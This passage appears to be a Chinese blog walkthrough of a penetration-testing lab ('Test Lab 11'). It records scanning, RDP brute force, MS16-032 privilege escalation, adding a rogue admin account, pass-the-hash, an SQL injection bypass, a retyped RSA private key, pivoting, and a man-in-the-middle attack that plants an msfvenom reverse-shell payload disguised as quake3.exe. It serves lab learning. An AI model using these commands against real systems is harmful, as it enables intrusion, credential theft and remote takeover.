+<p>登陆<code class="highlighter-rouge">192.168.101.11</code>这台机器，发现其内网还有三台机器，使用扫描器扫描端口：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tech@tl11-gw-2:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.13.1-3
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512637696380.png" alt="Alt text" /></p>
+
+<p>三台机器都开放了3389端口。</p>
+
+<p>通过ssh对<code class="highlighter-rouge">192.168.13.1</code>进行端口转发，将3389端口转发到本地的3389端口：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ssh <span class="nt">-L</span> 3389:192.168.13.1:3389 <span class="nt">-p</span> 2222 <span class="nt">-i</span> ~/Desktop/officetwo.key tech@192.168.101.11
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512715463471.png" alt="Alt text" /></p>
+
+<p>下载<a href="https://github.com/FreeRDP/FreeRDP">freerdp</a>（该工具可以通过hash传递连接远程桌面）安装：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install freerdp-x11
+</code></pre></div></div>
+
+<p>打开3389，连接：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /v:127.0.0.1 <span class="nt">-sec-nla</span> /u:<span class="s2">""</span>
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512715662641.png" alt="Alt text" /></p>
+
+<p>登陆失败之后，得到账户为<code class="highlighter-rouge">arm554</code>,进行爆破：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# hydra <span class="nt">-t</span> 8 <span class="nt">-V</span> <span class="nt">-l</span> arm554 <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt rdp://127.0.0.1
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512716038392.png" alt="Alt text" /></p>
+
+<p>爆破得到密码为<code class="highlighter-rouge">tiger</code>，使用该密码登陆远程机器：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop <span class="nt">-u</span> arm554 <span class="nt">-r</span> disk:share<span class="o">=</span>/root/Downloads/ 127.0.0.1
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512716933414.png" alt="Alt text" /></p>
+
+<p>利用<a href="https://www.exploit-db.com/exploits/39719/">ms16_032</a>提权：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\a</span>rm554<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt; powershell <span class="nt">-ExecutionPolicy</span> Bypass
+
+PS C:<span class="se">\U</span>sers<span class="se">\a</span>rm554<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt; Import-Module .<span class="se">\3</span>9719.ps1
+
+PS C:<span class="se">\U</span>sers<span class="se">\a</span>rm554<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt; Invoke-MS16-032
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512722200207.png" alt="Alt text" /></p>
+
+<p>添加用户：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\a</span>rm554<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt;net user sb sb /add
+The <span class="nb">command </span>completed successfully.
+
+
+C:<span class="se">\U</span>sers<span class="se">\a</span>rm554<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp&gt;net localgroup administrators sb /add
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512722385194.png" alt="Alt text" /></p>
+
+<p>登陆新添加的账户，找到了token：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512723064279.png" alt="Alt text" /></p>
+
+<h3 id="ad-token">AD Token</h3>
+
+<p>下载文件：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512725270473.png" alt="Alt text" /></p>
+
+<p>获得一些信息</p>
+
+<p>使用nmap扫描<code class="highlighter-rouge">172.16.0.10</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-sV</span> <span class="nt">-n</span> 172.16.0.10
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512926932598.png" alt="Alt text" /></p>
+
+<p>扫描结果可以看出该IP是AD.</p>
+
+<p>使用msf的信息收集模块进行Kerberos域用户枚举：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf <span class="o">&gt;</span> use auxiliary/gather/kerberos_enumusers
+
+msf auxiliary<span class="o">(</span>kerberos_enumusers<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST 172.16.0.10
+
+msf auxiliary<span class="o">(</span>kerberos_enumusers<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE /root/user.txt
+
+msf auxiliary<span class="o">(</span>kerberos_enumusers<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>DOAMIN test.lab
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512933753800.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512933785834.png" alt="Alt text" /></p>
+
+<p><code class="highlighter-rouge">arm554</code>这个用户存在于<code class="highlighter-rouge">test.lab</code>这个域。</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512933951020.png" alt="arm554的hash" /></p>
+
+<p>使用smbclient连接该IP,尝试使用<code class="highlighter-rouge">tiger</code>尝试连接失败：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 172.16.0.10 <span class="nt">-U</span> arm554
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512934174843.png" alt="Alt text" /></p>
+
+<p>进行hash传递：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# pth-smbclient <span class="nt">--user</span><span class="o">=</span>arm554 <span class="nt">--pw-nt-hash</span> <span class="nt">-m</span> smb3 <span class="nt">-L</span> 172.16.0.10 <span class="se">\\\\</span>172.16.0.10<span class="se">\\</span> 6361DEA164EE8FE91FE7B117FBC9CA5E
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512935252882.png" alt="Alt text" /></p>
+
+<p>爆出共享的文件，尝试直接连接到<code class="highlighter-rouge">files</code>文件夹，然后连接成功：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# pth-smbclient <span class="nt">--user</span><span class="o">=</span>arm554 <span class="nt">--pw-nt-hash</span> <span class="nt">-m</span> smb3 <span class="se">\\\\</span>172.16.0.10<span class="se">\\</span>files 6361DEA164EE8FE91FE7B117FBC9CA5E
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512935352871.png" alt="Alt text" /></p>
+
+<p>使用<code class="highlighter-rouge">get token.txt</code>下载<code class="highlighter-rouge">token.txt</code>,并查看得到token是<code class="highlighter-rouge">No_more_admins</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512968261223.png" alt="Alt text" /></p>
+
+<h3 id="cups-token">CUPS TOKEN</h3>
+
+<p>根据信息，尝试通过arp表找子网。就直接访问<code class="highlighter-rouge">172.16.0.14</code>查找线索。</p>
+
+<p>尝试SQL注入，username：<code class="highlighter-rouge">admin</code>,password:<code class="highlighter-rouge"> admin' or 1=1 --</code> ，爆出图片:</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512968841462.png" alt="Alt text" /></p>
+
+<p>将<code class="highlighter-rouge">004e006f005f00700061007000650072</code>转换成ascii码:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'004e006f005f00700061007000650072'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+</code></pre></div></div>
+
+<p>得到<code class="highlighter-rouge">No_paper</code></p>
+
+<h3 id="director-token">Director Token</h3>
+
+<p>继续翻找图片：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512969154528.png" alt="Alt text" /></p>
+
+<p>草–根据图片，一个个敲进去：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA4CxmKK2/kvV0+srp24bVZm+yYvCz+rvgHHxX1w7F0oD8aUDI
+won79K9XpntFDPUvtJRMg9WqK/zKUwLsMQLGWT66PT4GVbQw4Nr56rOrBIuag/qg
+o9WcX0AfIyFYFCNz0TnLfRXSDcSQY0CRK8WfKx5c8uP2kudtzAGv5GQCpSjM2uNV
+shOu7xmgo/AMUQvPi8kvD/gAme9G8WkTgpVpAwlsthjxQ9fEO6abHHkjbGGec0O8
+4T7Bo2nU8bHjr6Jd+dzUAvytblG1yNvGIybAFAsVqUHjbt9wGZgFKr1kA+3ZCbyF
+qFZZ37dpZr2grZXwzlCtPUJGuMfCq7N0ZhmcAwIDAQABAoIBAQDCXPx+TJcLXhJ8
+164HjlI8LKAoNLZ3sKlRSWYHqmFOcFNpFqh6M5Tmw5hlWf+2imdAVEw7Cegvl0/8
+xU3v+I3tFvv22W44pLC0ZGfHXNvsZvYjdAwPwMeBtmDI3sI1Q7/JKikKXP7wvPrL
+c1Hq979XbU39sjU5jbqe5N+SUDwS4Tu79L0uXehnqvCSlyIU9joDhvW87DeaLRaQ
+wwkKR9gnPtiKebZ73VGParJ42CZlRgfEOvoLWUk+YrhRfZ9r4uva0IHbZ1LhqNcL
+k0OlKEDUDzuju0/YwgBSZVSrhkCAnCnipsxQMc4g2aytPOTdKz4BtF+cZV/rXhyM
+kSPIeh1xAoGBAPJfcCQWqsq/dwwOC9I9jWj4W9xAFPbaPSq1oGwNr0ugZ/4DZLGe
+glGte8iG/Tc1Lb1Ege2dYPRR5OeFhyo8tADPKleFvDBYGN2asf4JirljxrW5F+ON
+q5paXqjbaBKk/Z6f08UlwxjSHRHOWqEvYZkm5bAxrufNKBVpwVWHU6eNAoGBAOzH
+AryHBdo45qLnzJR87zDftNNrualVmhWu+h+I7zj4hr52gM/TheHL/ODJZCyZU3vt
+7ncDjUM91xwh63vkCiByEYk4vTGnmaj9brmndracJ7jwwSUn/YqPj0D3yD0lrpxd
+PLn0c1ic5jaoTSWZN748PoPnP+CPvhjQYvxX5OXPAoGALmnEScTlc+nyXCaccOhE
+miNlQ+opmZP1PqaFT+vw876F64iu0ayu/AEiwSXIe7f9SE9EKkKG/IJqOUPCvH3f
+YoBIdXUwsnlMWbNz/lfJbvMCbG5Detn4UJiZo/BQH7Hht2mX3hr7H1etJWnExTUT
+lYZzWahI/C23TVJxKXW+uUkCgYEAnLDOhMit/M3vAxt27UUIXUWNuuPtSmH9yB+1
+cq0B8qe1M9HkSKRoUxbVUES2QDVvY/H+/0+gakFAW2OvHJu6f+I87JxZx8RsEcM1
+RTMngo0wVFku2FHwnYOHf6z6HE0VknC5QS4eLyQVzVHvS9RraT8g99VPFmLKoE43
+U1svJU0CgYAecYtH3ZvIwPA85sTuTkKAGMmvRxzPnQkyjUF9BwN+B1mfL4uZyJVy
+VVWhCwXf/h9G3fKzuV0m0Dz6O7r5DqRqs0uCNbxPaS8qWPcRckwV2Y9htMjXLtXU
+nOV4UZBbQSZb/AoSFdcCBjonbudkiAxzm0STdiQ92kZNavvfZAjXQw<span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>使用ssh连接：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# chmod 600 morgan.key 
+
+root@kali:~# ssh <span class="nt">-i</span> morgan.key morgan@172.16.0.252
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512970645892.png" alt="Alt text" /></p>
+
+<p>在机器上执行<code class="highlighter-rouge">/sbin/route -nee</code>，查看路由:</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512970783649.png" alt="Alt text" /></p>
+
+<p>安装<a href="https://github.com/apenwarr/sshuttle">sshuttle</a>：<code class="highlighter-rouge">pip install sshuttle</code>,然后使用sshuttle进行端口转发:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshuttle <span class="nt">-e</span> <span class="s2">"ssh -i morgan.key"</span> <span class="nt">-r</span> morgan@172.16.0.252 192.168.10.0/24 192.168.11.0/24 192.168.12.0/24
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512971216269.png" alt="Alt text" /></p>
+
+<p>使用xfreerdp连接<code class="highlighter-rouge">192.168.12.1-3</code>机器，试出之前找出的密码可在<code class="highlighter-rouge">192.168.12.2</code>上登陆：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2
+</code></pre></div></div>
+
+<p>登陆进去之后翻找文件，在soft文件夹找到了<code class="highlighter-rouge">nc</code>和<code class="highlighter-rouge">Intercepter-NG</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1513062966698.png" alt="Alt text" /></p>
+
+<p>进行<code class="highlighter-rouge">smart scan</code>，扫描出三个IP：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1513063004866.png" alt="Alt text" /></p>
+
+<p>进入DHCP，设置参数，serverip和DHCP Scope为<code class="highlighter-rouge">192.168.12.1</code>,网关为<code class="highlighter-rouge">192.168.12.3</code>进行嗅探：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1513067322375.png" alt="Alt text" /></p>
+
+<p>在RAW中的<code class="highlighter-rouge">Pcap filter</code>设置为<code class="highlighter-rouge">port not 3389</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/quake3.png" alt="Alt text" /></p>
+
+<p><code class="highlighter-rouge">192.168.12.1</code>不断向<code class="highlighter-rouge">192.168.12.3</code>请求<code class="highlighter-rouge">quake3.exe</code>这个程序。可进行中间人攻击，使得目标机器下载我们定制的<code class="highlighter-rouge">quake3.exe</code>。</p>
+
+<p>msfvenom生成<code class="highlighter-rouge">quake3.exe</code>,然后nc上传到机器上。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.12.2 <span class="nv">LPORT</span><span class="o">=</span>80 <span class="nt">-f</span> exe <span class="o">&gt;</span> quake3.exe
+
+nc <span class="nt">-w</span> 3 192.168.12.2 1234 &lt; quake3.exe
+</code></pre></div></div>
+
+<p>内网机器：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 1234 <span class="o">&gt;</span> quake3.exe
+</code></pre></div></div>
+
+<p>Intercepter进行MITM攻击，在MITM模式下设置<code class="highlighter-rouge">SSL Strip</code>和注入规则:</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/inject_rules.png" alt="" /></p>
+
+<p>攻击成功返回Shell：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/inject_nc_success.png" alt="" /></p>
+
+<p>找到了token:<code class="highlighter-rouge">Sn1ff_Sn1ff</code></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/192168111ssh_key.png" alt="" /></p>
+
+<p>这网络无法吐槽，简直是没办法玩下去。</p>
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/27/open-RDP/">开启RDP
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/11/29/proxy/">代理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/11/29/port-fowarding-and-socks-proxy/">Socks端口转发和Socks端口代理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/11/29/proxy/">代理</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/12/19/build-domain/">域环境</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/11/30/Test-LAB-11/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/11/30/Test-LAB-11/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
